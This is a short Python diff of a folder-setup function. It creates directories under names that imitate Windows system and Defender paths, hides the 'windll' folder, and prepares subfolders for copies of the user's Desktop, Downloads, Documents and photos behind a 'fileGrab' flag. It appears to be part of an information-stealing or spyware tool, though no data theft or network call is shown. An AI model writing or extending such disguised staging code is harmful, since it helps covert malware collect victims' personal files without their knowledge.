@@ -27,12 +27,13 @@ def makeFolders(fileGrab,startOne):
     else:
         if startOne:
             makedirs(rf'{pathf}\system\sysFiles\winDef')
-            open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
+            f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
+            f.close()
         makedirs(rf'{pathf}\windll\System')
         SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
         makedirs(rf'{pathf}\windll\Photos')
         if not fileGrab:
-            makedirs(rf'{pathf}\windll\DocumentFiles\Desktop')
-            makedirs(rf'{pathf}\windll\DocumentFiles\Downloads')
-            makedirs(rf'{pathf}\windll\DocumentFiles\Documents')
+            makedirs(rf'{pathf}\windll\Files\DocumentFiles\Desktop')
+            makedirs(rf'{pathf}\windll\Files\DocumentFiles\Downloads')
+            makedirs(rf'{pathf}\windll\Files\DocumentFiles\Documents')
 
